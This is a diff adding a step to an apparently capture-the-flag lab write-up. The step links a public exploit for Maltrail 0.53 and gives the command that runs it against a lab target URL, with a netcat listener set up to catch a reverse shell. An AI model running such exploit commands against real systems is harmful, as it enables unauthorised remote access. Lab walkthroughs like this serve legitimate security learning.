@@ -170,7 +170,21 @@ cool, now that we've created a new basket ```bankai```, we can navigate to the u
 
 ![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/247238d5-085a-4a18-ab2f-19863aded691)
 
-So, we get this webpage powered by ```maltrail 0.53```. This version of ```maltrail``` has a public exploit. You can access it 
+So, we get this webpage powered by ```maltrail 0.53```. This version of ```maltrail``` has a public exploit. You can download it [here](https://github.com/spookier/Maltrail-v0.53-Exploit/blob/main/exploit.py)
+
+Running the downloaded exploit,
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/9d9ded4b-5353-4fc7-978d-ac061158fdf5)
+
+We need to provide those parameters.
+
+Doing that,
+
+command:```python exploit.py 10.10.14.111 1234 http://10.10.11.224:55555/bankai```
+
+Ensure you have a netcat listener running before running the above command,
+
+
 
 
 
